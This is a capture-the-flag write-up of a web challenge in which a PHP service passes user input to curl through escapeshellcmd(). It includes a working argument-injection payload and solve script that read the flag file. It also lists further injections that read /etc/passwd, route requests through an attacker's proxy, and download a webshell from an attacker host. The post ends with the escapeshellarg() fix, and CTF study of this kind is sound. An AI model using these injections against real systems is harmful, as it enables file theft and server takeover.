---
layout: post
title: "CurlAsAService"
date: 2027-08-02 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, argument-injection, curl, escapeshellcmd, lfi, file-read, CWE-88]
---

## Overview

CurlAsAService is an Easy HTB Web challenge built around a PHP "health checker" that shells out to `curl` with user-supplied input. The vulnerability is a classic [argument injection](https://cwe.mitre.org/data/definitions/88.html): the app sanitizes with `escapeshellcmd()` instead of `escapeshellarg()`, leaving spaces and dashes unescaped. A single POST request injects `--proto file file:///flag` to override curl's protocol restriction and read the container's local flag file.

---

## The Technique

PHP's `CommandModel` builds the shell command like this:

```php
$this->command = "curl --proto =http,https -sSL " . escapeshellcmd($url) . " 2>&1";
shell_exec($this->command);
```

The key distinction between the two functions:

| Function | Escapes shell metacharacters? | Escapes spaces and dashes? |
|---|---|---|
| `escapeshellcmd($x)` | Yes (`&;`\|`*?~<>^()[]{}$\` + quotes) | **No** |
| `escapeshellarg($x)` | Yes (wraps in single quotes) | **Yes — injection impossible** |

Because spaces and dashes survive `escapeshellcmd()`, any token injected after a space is treated by the shell as a separate curl flag. This is [CWE-88](https://cwe.mitre.org/data/definitions/88.html) — Improper Neutralization of Argument Delimiters in a Command.

curl's `--proto` flag sets which URL schemes are allowed. When `--proto` appears more than once on the same command line, **the last occurrence wins**. Injecting `--proto file file:///flag` produces:

```
curl --proto =http,https -sSL --proto file file:///flag 2>&1
```

The injected `--proto file` overrides the original `=http,https` restriction, and `file:///flag` makes the server's own `curl` process read the container's `/flag` file. The output is returned directly in the JSON response.

---

## Solution

Start by confirming the endpoint accepts a POST to `/api/curl` with an `ip` parameter:

```bash
curl -s http://<host>:<port>/api/curl -d 'ip=http://127.0.0.1'
```

Then inject the protocol override to read the local flag:

```bash
curl -s -X POST http://<host>:<port>/api/curl -d 'ip=--proto file file:///flag'
```

Response:

```json
{"message":"HTB{...}"}
```

Or with the full `solve.py`:

```python
#!/usr/bin/env python3
"""
CurlAsAService (HTB Web, Easy) — curl option injection via escapeshellcmd()
"""
import sys, requests

TARGET = sys.argv[1]  # host:port

payload = "--proto file file:///flag"
r = requests.post(f"http://{TARGET}/api/curl", data={"ip": payload})
print(r.json()["message"])
```

```bash
python3 solve.py <host>:<port>
```

---

## Why It Worked

`escapeshellcmd()` was designed to prevent **shell injection** — blocking characters like `;`, `|`, and `` ` `` that would start a new shell command. It was never designed to prevent **[argument injection](https://cwe.mitre.org/data/definitions/88.html)**, where extra flags are passed to the subprocess via spaces within a single argument.

curl accepts many powerful flags — `--proto`, `-o`, `-x` (proxy), `--resolve`, `-d @/etc/passwd` — any of which can be injected once the space constraint is removed. The `--proto` override is particularly clean because it uses only alphanumeric characters and slashes, which `escapeshellcmd()` leaves entirely untouched.

Other useful injections against the same surface:

- `--proto file file:///etc/passwd` — read any world-readable local file  
- `-x http://<attacker>:8080 http://127.0.0.1/` — proxy all requests through an attacker-controlled server  
- `-o /var/www/html/shell.php http://<attacker>/shell.txt` — write a webshell if the process has docroot write access  

---

## Fix / Defense

Replace `escapeshellcmd()` with `escapeshellarg()`:

```php
// Fixed — escapeshellarg() wraps the value in single quotes; injection impossible
$this->command = "curl --proto =http,https -sSL " . escapeshellarg($url) . " 2>&1";
shell_exec($this->command);
```

Better still: use PHP's native cURL extension (`curl_init()` / `curl_setopt()` / `curl_exec()`) so no shell is involved at all. If a shell-out is unavoidable, also validate the URL with `filter_var($url, FILTER_VALIDATE_URL)` and enforce an explicit scheme allowlist before the command is built.

The same [argument injection](https://cwe.mitre.org/data/definitions/88.html) pattern applies to any CLI tool shelled out with user input — `wget`, `ffmpeg`, `convert`, `zip`, `git clone` — each carrying its own set of dangerous flags waiting to be injected.
